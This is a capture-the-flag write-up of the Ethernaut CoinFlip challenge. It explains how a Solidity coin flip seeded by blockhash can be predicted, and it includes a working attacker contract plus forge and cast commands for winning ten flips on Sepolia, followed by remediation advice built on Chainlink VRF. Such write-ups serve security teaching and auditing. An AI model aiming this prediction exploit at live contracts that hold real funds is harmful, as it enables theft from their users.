# Ethernaut Challenge 03 — CoinFlip

## Goal

The challenge is solved when `consecutiveWins` reaches 10.

**Instance:**

```text
0x05C1B9828B19faa89F3B0d5938952FEBE7b24faD
```

## Vulnerability

The contract determines the outcome of a coin flip using `blockhash` and `block.number`:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

This is presented as a random 50/50 guess, but it is fully deterministic. `blockhash(block.number - 1)` is a fixed, publicly readable value for any given block. Anyone can compute the same result before or during the same transaction.

The contract tries to prevent duplicate submissions within the same block:

```solidity
if (lastHash == blockValue) {
    revert();
}
```

But this does not prevent prediction — it only prevents two flips in the same block.

The root cause is using on-chain data as a source of randomness. Every value available inside the EVM (`blockhash`, `block.number`, `block.timestamp`, `block.difficulty`) is either public or manipulable, and cannot be used as a secret.

## Attack Path

```text
Deploy CoinFlipAttacker
    ↓
attacker.attack() called once per block
    ↓
Computes blockhash(block.number - 1) / FACTOR  ← same block as flip()
    ↓
Calls CoinFlip.flip(side) with guaranteed correct guess
    ↓
consecutiveWins++ on every call
    ↓
Repeat 10 times across 10 blocks
```

Because both computations happen in the same transaction, they are guaranteed to agree. There is no race condition.

## Proof of Concept

An attacker contract was deployed to Sepolia and called 10 times, once per block.

**Attacker contract:**

```solidity
contract CoinFlipAttacker {
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip public immutable target;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = (blockValue / FACTOR) == 1;
        require(target.flip(side), "wrong guess");
    }
}
```

### 1. Deploy the attacker contract

```bash
forge script script/challenge-03_Coinflip/CoinFlipAttack.s.sol \
    --tc CoinFlipAttackScript \
    --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vvv
```

Add the printed address to `.env`:

```text
ATTACKER_ADDRESS=0xafa67C431bE23e33ece908604Cdb5703a4c1D1d8
```

### 2. Run 10 attacks, one per block

```bash
for i in {1..10}; do
  echo "--- Attack $i/10 ---"
  forge script script/challenge-03_Coinflip/CoinFlipAttack.s.sol \
    --tc CoinFlipAttackScript \
    --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vvv
  [ $i -lt 10 ] && sleep 15
done
```

Each iteration lands in a different block (~12s apart on Sepolia). All 10 guesses were correct.

### 3. Verify the win count

```bash
cast call 0x05C1B9828B19faa89F3B0d5938952FEBE7b24faD \
    "consecutiveWins()(uint256)" \
    --rpc-url $RPC_URL
```

Returns `10`.

## Impact

**Severity: High**

The contract's game mechanic is entirely broken. Any caller who computes `blockhash(block.number - 1) / FACTOR` before calling `flip()` — or does so atomically inside a contract — wins every single time. There is no valid defense within the contract as written because the "randomness" is derived from data that is already finalised by the time a transaction executes.

## Remediation

Do not use any on-chain value as a source of randomness. All block properties are public and, in some cases, influenceable by validators.

The correct approach for on-chain randomness is to use a **commit-reveal scheme** combined with a verifiable external source such as **Chainlink VRF**:

```solidity
// Chainlink VRF v2 example
function requestRandomness() external returns (uint256 requestId) {
    return COORDINATOR.requestRandomWords(
        keyHash, subscriptionId, requestConfirmations, callbackGasLimit, numWords
    );
}

function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
    // randomWords[0] is the verifiably random value
}
```

This ensures the random value is generated off-chain with a cryptographic proof, and cannot be known or manipulated by the caller or any on-chain actor.

## Audit Takeaway

**Never derive randomness from block properties. All EVM state is public and deterministic.**

`blockhash`, `block.timestamp`, `block.number`, and `block.difficulty` are observable by anyone and can be read inside the same transaction they are used in. An attacker contract can replicate the exact calculation atomically, guaranteeing the correct answer on every call.

This is a classic **weak on-chain randomness** vulnerability, one of the most common issues in smart contract auditing.
